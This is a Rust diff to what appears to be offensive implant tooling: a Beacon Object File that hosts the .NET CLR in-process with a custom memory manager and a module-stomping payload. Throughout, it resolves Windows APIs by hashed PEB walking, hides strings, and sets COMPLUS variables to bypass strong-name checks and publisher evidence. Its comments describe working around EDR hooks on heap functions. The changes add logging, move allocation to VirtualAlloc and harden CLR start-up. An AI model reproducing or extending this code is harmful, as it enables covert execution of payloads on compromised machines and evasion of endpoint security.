@@ -33,7 +33,6 @@ const S_OK: i32 = 0;
 const E_NOINTERFACE: i32 = 0x80004002_u32 as i32;
 const E_NOTIMPL: i32 = 0x80004001_u32 as i32;
 const E_OUTOFMEMORY: i32 = 0x8007000E_u32 as i32;
-const MALLOC_EXECUTABLE: u32 = 0x0000_0004;
 
 const BOF_STATE_MAGIC: u32 = 0x534E_4A54; // "SNJT"
 const HOST_OBJECTS_ANCHOR: u32 = 0xDEAD_BEEF;
@@ -151,11 +150,13 @@ unsafe extern "system" fn hc_get_host_manager(
     unsafe {
         let obj = this as *mut HostControlObject;
         if guid_eq(&*riid, &IID_IHOST_MEMORY_MANAGER) {
+            crate::dlog2(b"[mm] GetHostManager: returning MM");
             let mm = (*obj).memory_manager;
             mm_addref(mm as *mut c_void);
             *ppv = mm as *mut c_void;
             return S_OK;
         }
+        crate::dlog2(b"[mm] GetHostManager: E_NOINTERFACE");
         *ppv = core::ptr::null_mut();
         E_NOINTERFACE
     }
@@ -208,14 +209,13 @@ unsafe extern "system" fn mm_create_malloc(
     this: *mut c_void, dw_malloc_type: u32, pp_malloc: *mut *mut c_void,
 ) -> i32 {
     unsafe {
+        crate::dlog2(b"[mm] CreateMalloc called");
+        let _ = dw_malloc_type;
+
         type GlobalAllocFn = unsafe extern "system" fn(u32, usize) -> *mut c_void;
-        type HeapCreateFn = unsafe extern "system" fn(u32, usize, usize) -> *mut c_void;
+        type GetProcessHeapFn = unsafe extern "system" fn() -> *mut c_void;
 
         let global_alloc_fn: GlobalAllocFn = match peb_fn(hash!("kernel32.dll"), hash!("GlobalAlloc")) {
-            Some(f) => f,
-            None => return E_OUTOFMEMORY,
-        };
-        let heap_create: HeapCreateFn = match peb_fn(hash!("kernel32.dll"), hash!("HeapCreate")) {
             Some(f) => f,
             None => return E_OUTOFMEMORY,
         };
@@ -226,9 +226,16 @@ unsafe extern "system" fn mm_create_malloc(
         }
         let hm_obj = hm_raw as *mut HostMallocObject;
 
-        let heap_flags: u32 = if dw_malloc_type & MALLOC_EXECUTABLE != 0 { 0x0004 } else { 0 };
-        let heap = heap_create(heap_flags, 0, 0);
+        // Use the process heap rather than a newly created heap. HeapCreate(0,0,0)
+        // can raise SEH exceptions inside CLR's EEStartup (global heap validation
+        // flags or EDR hooks on custom heaps). The process heap is always valid and
+        // pre-warmed for the lifetime of the process.
+        let heap = match peb_fn::<GetProcessHeapFn>(hash!("kernel32.dll"), hash!("GetProcessHeap")) {
+            Some(f) => f(),
+            None => core::ptr::null_mut(),
+        };
         if heap.is_null() {
+            crate::dlog2(b"[mm] CreateMalloc: GetProcessHeap failed");
             type GlobalFreeFn = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
             if let Some(gf) = peb_fn::<GlobalFreeFn>(hash!("kernel32.dll"), hash!("GlobalFree")) {
                 gf(hm_raw);
@@ -246,6 +253,7 @@ unsafe extern "system" fn mm_create_malloc(
 
         (*mm).malloc_obj = hm_obj;
         *pp_malloc = hm_obj as *mut c_void;
+        crate::dlog2(b"[mm] CreateMalloc ok");
         S_OK
     }
 }
@@ -255,14 +263,24 @@ unsafe extern "system" fn mm_virtual_alloc(
     fl_alloc: u32, fl_protect: u32, _crit_level: u32, pp_mem: *mut *mut c_void,
 ) -> i32 {
     unsafe {
+        crate::dlog2(b"[mm] VirtualAlloc called");
         type VirtualAllocFn = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
         match peb_fn::<VirtualAllocFn>(hash!("kernel32.dll"), hash!("VirtualAlloc")) {
             Some(f) => {
                 let p = f(p_addr, dw_size, fl_alloc, fl_protect);
                 *pp_mem = p;
-                if p.is_null() { E_OUTOFMEMORY } else { S_OK }
+                if p.is_null() {
+                    crate::dlog2(b"[mm] VirtualAlloc: returned null");
+                    E_OUTOFMEMORY
+                } else {
+                    crate::dlog2(b"[mm] VirtualAlloc ok");
+                    S_OK
+                }
             }
-            None => E_OUTOFMEMORY,
+            None => {
+                crate::dlog2(b"[mm] VirtualAlloc: peb_fn failed");
+                E_OUTOFMEMORY
+            }
         }
     }
 }
@@ -317,7 +335,10 @@ unsafe extern "system" fn mm_get_memory_load(
     }
 }
 
-unsafe extern "system" fn mm_register_cb(_this: *mut c_void, _cb: *mut c_void) -> i32 { S_OK }
+unsafe extern "system" fn mm_register_cb(_this: *mut c_void, _cb: *mut c_void) -> i32 {
+    crate::dlog2(b"[mm] RegisterMemNotifCb called");
+    S_OK
+}
 unsafe extern "system" fn mm_needs_vas(_this: *mut c_void, _base: *mut c_void, _sz: usize) -> i32 { S_OK }
 unsafe extern "system" fn mm_released_vas(_this: *mut c_void, _base: *mut c_void) -> i32 { S_OK }
 
@@ -342,6 +363,7 @@ unsafe extern "system" fn mm_acquired_vas(
     this: *mut c_void, start_addr: *mut c_void, size: usize,
 ) -> i32 {
     unsafe {
+        crate::dlog2(b"[mm] AcquiredVAS called");
         let mm = this as *mut MemoryManagerObject;
         let sp = (*mm).stomp_payload;
         if sp.is_null() {
@@ -526,18 +548,36 @@ unsafe extern "system" fn hm_release(this: *mut c_void) -> u32 {
 }
 
 unsafe extern "system" fn hm_alloc(
-    this: *mut c_void, cb: usize, _crit: u32, pp_mem: *mut *mut c_void,
+    _this: *mut c_void, cb: usize, _crit: u32, pp_mem: *mut *mut c_void,
 ) -> i32 {
     unsafe {
-        let obj = this as *mut HostMallocObject;
-        type HeapAllocFn = unsafe extern "system" fn(*mut c_void, u32, usize) -> *mut c_void;
-        match peb_fn::<HeapAllocFn>(hash!("kernel32.dll"), hash!("HeapAlloc")) {
+        crate::dlog2(b"[mm] Alloc called");
+        crate::dlog2_hex(b"[mm] Alloc: cb=", cb as u32);
+        // Use VirtualAlloc instead of HeapAlloc: HeapAlloc raises SEH exceptions
+        // on this target (EDR hook or global heap validation flags). VirtualAlloc
+        // never raises — returns NULL on failure.
+        type VirtualAllocFn = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
+        match peb_fn::<VirtualAllocFn>(hash!("kernel32.dll"), hash!("VirtualAlloc")) {
             Some(f) => {
-                let p = f((*obj).heap_handle, 0x0008, cb);
+                crate::dlog2(b"[mm] Alloc: calling VirtualAlloc");
+                // Allocate at least 1 byte; size=0 is undefined for VirtualAlloc.
+                let sz = if cb == 0 { 1 } else { cb };
+                // MEM_COMMIT | MEM_RESERVE = 0x3000, PAGE_READWRITE = 0x04
+                let p = f(core::ptr::null_mut(), sz, 0x3000, 0x04);
+                crate::dlog2(b"[mm] Alloc: VirtualAlloc returned");
                 *pp_mem = p;
-                if p.is_null() { E_OUTOFMEMORY } else { S_OK }
+                if p.is_null() {
+                    crate::dlog2(b"[mm] Alloc FAILED (VirtualAlloc null)");
+                    E_OUTOFMEMORY
+                } else {
+                    crate::dlog2(b"[mm] Alloc ok");
+                    S_OK
+                }
             }
-            None => E_OUTOFMEMORY,
+            None => {
+                crate::dlog2(b"[mm] Alloc FAILED (no VirtualAlloc)");
+                E_OUTOFMEMORY
+            },
         }
     }
 }
@@ -549,17 +589,17 @@ unsafe extern "system" fn hm_debug_alloc(
     unsafe { hm_alloc(this, cb, crit, pp_mem) }
 }
 
-unsafe extern "system" fn hm_free(this: *mut c_void, p_mem: *mut c_void) -> i32 {
+unsafe extern "system" fn hm_free(_this: *mut c_void, p_mem: *mut c_void) -> i32 {
     unsafe {
-        let obj = this as *mut HostMallocObject;
-        type HeapFreeFn = unsafe extern "system" fn(*mut c_void, u32, *mut c_void) -> i32;
-        match peb_fn::<HeapFreeFn>(hash!("kernel32.dll"), hash!("HeapFree")) {
-            Some(f) => {
-                f((*obj).heap_handle, 0, p_mem);
-                S_OK
-            }
-            None => S_OK,
+        if p_mem.is_null() {
+            return S_OK;
         }
+        // Mirror of hm_alloc: use VirtualFree(MEM_RELEASE) to match VirtualAlloc.
+        type VirtualFreeFn = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;
+        if let Some(f) = peb_fn::<VirtualFreeFn>(hash!("kernel32.dll"), hash!("VirtualFree")) {
+            f(p_mem, 0, 0x8000); // MEM_RELEASE
+        }
+        S_OK
     }
 }
 
@@ -903,7 +943,8 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                     peb_fn(hash!("kernel32.dll"), hash!("SetEnvironmentVariableA"));
 
                 let mut old_zap = [0u8; 256];
-                let mut old_sn = [0u8; 256];
+                let mut old_sn  = [0u8; 256];
+                let mut old_pub = [0u8; 256];
                 let had_zap = get_env.is_some_and(|f| {
                     let k = obf!("COMPLUS_ZapDisable\0");
                     f(k.as_bytes().as_ptr(), old_zap.as_mut_ptr(), 256) > 0
@@ -912,6 +953,10 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                     let k = obf!("COMPLUS_AllowStrongNameBypass\0");
                     f(k.as_bytes().as_ptr(), old_sn.as_mut_ptr(), 256) > 0
                 });
+                let had_pub = get_env.is_some_and(|f| {
+                    let k = obf!("COMPLUS_GeneratePublisherEvidence\0");
+                    f(k.as_bytes().as_ptr(), old_pub.as_mut_ptr(), 256) > 0
+                });
                 if let Some(se) = set_env {
                     let k1 = obf!("COMPLUS_ZapDisable\0");
                     let v1 = obf!("1\0");
@@ -919,10 +964,18 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                     let k2 = obf!("COMPLUS_AllowStrongNameBypass\0");
                     let v2 = obf!("1\0");
                     se(k2.as_bytes().as_ptr(), v2.as_bytes().as_ptr());
+                    // Prevent CAS publisher-evidence generation during EEStartup.
+                    // Without this, CLR validates Authenticode certificates online
+                    // (CRL check) for each IL assembly it loads when ZapDisable=1.
+                    // On a network-isolated host the check times out after ~90 s
+                    // and ICLRRuntimeHost::Start() returns E_FAIL.
+                    let k3 = obf!("COMPLUS_GeneratePublisherEvidence\0");
+                    let v0 = obf!("0\0");
+                    se(k3.as_bytes().as_ptr(), v0.as_bytes().as_ptr());
                 }
 
                 // Macro to restore COMPLUS env vars; called on every early-return path
-                // after the set block to prevent the vars from staying "1" permanently.
+                // after the set block to prevent the vars from staying set permanently.
                 macro_rules! restore_complus_env {
                     () => {
                         if let Some(se) = set_env {
@@ -937,6 +990,12 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                                 se(k2.as_bytes().as_ptr(), old_sn.as_ptr());
                             } else {
                                 se(k2.as_bytes().as_ptr(), core::ptr::null());
+                            }
+                            let k3 = obf!("COMPLUS_GeneratePublisherEvidence\0");
+                            if had_pub {
+                                se(k3.as_bytes().as_ptr(), old_pub.as_ptr());
+                            } else {
+                                se(k3.as_bytes().as_ptr(), core::ptr::null());
                             }
                         }
                     };
@@ -988,6 +1047,7 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                     restore_complus_env!();
                     return Err(BofError::Clr { hr, op: "fr8" });
                 }
+                crate::dlog2(b"[stomp] CLRCreateInstance ok");
                 let meta_host = meta_host as *mut opsec_com::clr::ICLRMetaHost;
 
                 let clr_ver_w = if input.clr_major >= 4 { V4_VERSION_W } else { V2_VERSION_W };
@@ -1006,6 +1066,7 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                     restore_complus_env!();
                     return Err(BofError::Clr { hr, op: "fr9" });
                 }
+                crate::dlog2(b"[stomp] GetRuntime ok");
                 let runtime_info = runtime_info as *mut opsec_com::clr::ICLRRuntimeInfo;
 
                 let mut started: i32 = 0;
@@ -1021,7 +1082,20 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                     restore_complus_env!();
                     return Err(BofError::ClrAlreadyRunning);
                 }
+                crate::dlog2(b"[stomp] IsStarted=0 fresh CLR");
 
+                // If clr.dll is already in the PEB but Start() never completed,
+                // this is a partial-init state from a prior frD on this Beacon.
+                // Re-entering GetInterface on partially-initialised CLR crashes.
+                if opsec_peb::resolve_module(hash!("clr.dll")).is_some() {
+                    crate::dlog2(b"[stomp] clr.dll in PEB partial-init bail");
+                    let unk = runtime_info as *mut IUnknown;
+                    ((*(*unk).vtbl).release)(unk as *mut c_void);
+                    restore_complus_env!();
+                    return Err(BofError::ClrAlreadyRunning);
+                }
+
+                crate::dlog2(b"[stomp] calling GetInterface ICLRRuntimeHost");
                 let mut custom_host_raw: *mut c_void = core::ptr::null_mut();
                 let hr = ((*(*runtime_info).vtbl).get_interface)(
                     runtime_info as *mut c_void,
@@ -1035,18 +1109,25 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                     restore_complus_env!();
                     return Err(BofError::Clr { hr, op: "frB" });
                 }
+                crate::dlog2(b"[stomp] GetInterface ICLRRuntimeHost ok");
                 let custom_host = custom_host_raw as *mut ICLRRuntimeHost;
 
-                let hr = ((*(*custom_host).vtbl).set_host_control)(
+                #[cfg(not(feature = "diag-skip-hc"))]
+                let hr_hc = ((*(*custom_host).vtbl).set_host_control)(
                     custom_host as *mut c_void,
                     hc_raw as *mut c_void,
                 );
+                #[cfg(feature = "diag-skip-hc")]
+                let hr_hc = {
+                    crate::dlog2(b"[stomp] SetHostControl SKIPPED (diag-skip-hc)");
+                    0i32
+                };
                 crate::dlog2(b"[stomp] SetHostControl returned");
-                if hr < 0 {
+                if hr_hc < 0 {
                     let unk = runtime_info as *mut IUnknown;
                     ((*(*unk).vtbl).release)(unk as *mut c_void);
                     restore_complus_env!();
-                    return Err(BofError::Clr { hr, op: "frC" });
+                    return Err(BofError::Clr { hr: hr_hc, op: "frC" });
                 }
 
                 let hr = ((*(*custom_host).vtbl).start)(custom_host as *mut c_void);
@@ -1058,20 +1139,7 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                     return Err(BofError::Clr { hr, op: "frD" });
                 }
 
-                if let Some(se) = set_env {
-                    let k1 = obf!("COMPLUS_ZapDisable\0");
-                    if had_zap {
-                        se(k1.as_bytes().as_ptr(), old_zap.as_ptr());
-                    } else {
-                        se(k1.as_bytes().as_ptr(), core::ptr::null());
-                    }
-                    let k2 = obf!("COMPLUS_AllowStrongNameBypass\0");
-                    if had_sn {
-                        se(k2.as_bytes().as_ptr(), old_sn.as_ptr());
-                    } else {
-                        se(k2.as_bytes().as_ptr(), core::ptr::null());
-                    }
-                }
+                restore_complus_env!();
 
                 let mut get_runtime_dir_buf = [0u16; 512];
                 let mut grd_len: u32 = 512;
@@ -1127,8 +1195,32 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
             .as_deref()
             .ok_or(BofError::Clr { hr: -1, op: "v0" })?;
 
+        // oleaut32.dll is needed for SysAllocStringLen (BSTR creation). CLR does not
+        // load it during EEStartup on all targets; load it now if absent.
+        crate::dlog2(b"[stomp] checking oleaut32.dll in PEB");
+        if resolve_module(hash!("oleaut32.dll")).is_none() {
+            crate::dlog2(b"[stomp] oleaut32.dll not in PEB - calling LoadLibraryW");
+            const OLEAUT32_W: &[u16] = &[
+                0x6F, 0x6C, 0x65, 0x61, 0x75, 0x74, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0,
+            ]; // "oleaut32.dll\0"
+            type LlwFn = unsafe extern "system" fn(*const u16) -> *mut c_void;
+            if let Some(f) = peb_fn::<LlwFn>(hash!("kernel32.dll"), hash!("LoadLibraryW")) {
+                let h = f(OLEAUT32_W.as_ptr());
+                if h.is_null() {
+                    crate::dlog2(b"[stomp] LoadLibraryW(oleaut32) FAILED");
+                } else {
+                    crate::dlog2(b"[stomp] LoadLibraryW(oleaut32) ok");
+                }
+            } else {
+                crate::dlog2(b"[stomp] LoadLibraryW not resolved");
+            }
+        } else {
+            crate::dlog2(b"[stomp] oleaut32.dll already in PEB");
+        }
+        crate::dlog2(b"[stomp] OwnedBstr::from_utf16");
         let victim_bstr = OwnedBstr::from_utf16(identity_slice)
             .ok_or(BofError::Clr { hr: -1, op: "v1" })?;
+        crate::dlog2(b"[stomp] OwnedBstr ok");
 
         let domain_name_w: Vec<u16> = input.app_domain.encode_utf16().chain(Some(0)).collect();
         let mut domain_unk: *mut c_void = core::ptr::null_mut();
